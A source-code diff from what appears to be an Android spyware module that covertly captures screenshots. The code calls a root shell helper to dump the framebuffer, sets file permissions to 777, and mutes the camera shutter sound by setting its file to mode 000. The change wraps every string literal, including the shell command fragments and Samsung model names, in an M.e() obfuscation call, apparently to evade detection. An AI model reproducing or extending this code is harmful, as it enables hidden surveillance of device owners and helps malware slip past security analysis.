@@ -181,7 +181,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 			try {
 				//disableClick();
 
-				ExecuteResult res = Execute.executeScript(sc + " -p " + frame + ";chmod 777 " + frame);
+				ExecuteResult res = Execute.executeScript(sc + M.e(" -p ") + frame + M.e(";chmod 777 ") + frame);
 				if (aframe.exists() && aframe.canRead()) {
 					Bitmap bitmap = readPng(aframe);
 					if (bitmap == null) {
@@ -206,14 +206,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private void enableClick() {
 		AutoFile file = new AutoFile(cameraSound);
 		if (file.exists()) {
-			file.chmod("777");
+			file.chmod(M.e("777"));
 		}
 	}
 
 	private void disableClick() {
 		AutoFile file = new AutoFile(cameraSound);
 		if (file.exists()) {
-			file.chmod("000");
+			file.chmod(M.e("000"));
 		}
 	}
 
@@ -382,7 +382,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		String model = Build.MODEL.toLowerCase();
 
 		// Samsung Galaxy Tab
-		if (model.contains("gt-p7500")) {
+		if (model.contains(M.e("gt-p7500"))) {
 			return true;
 		}
 
@@ -393,17 +393,17 @@ public class ModuleSnapshot extends BaseInstantModule {
 		String model = Build.MODEL.toLowerCase();
 
 		// Samsung Galaxy Tab
-		if (model.contains("gt-p7500")) {
+		if (model.contains(M.e("gt-p7500"))) {
 			return true;
 		}
 
 		// Samsung Galaxy S2
-		if (model.contains("gt-i9100")) {
+		if (model.contains(M.e("gt-i9100"))) {
 			return true;
 		}
 
 		// Samsung Galaxy S3
-		if (model.contains("gt-i9300")) {
+		if (model.contains(M.e("gt-i9300"))) {
 			return true;
 		}
 
@@ -462,8 +462,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
 
-			Execute.execute(Configuration.shellFile + " fb /data/data/"
-					+ Status.self().getAppContext().getPackageName() + "/files/frame");
+			Execute.execute(Configuration.shellFile + M.e(" fb /data/data/")
+					+ Status.self().getAppContext().getPackageName() +  M.e("/files/frame"));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
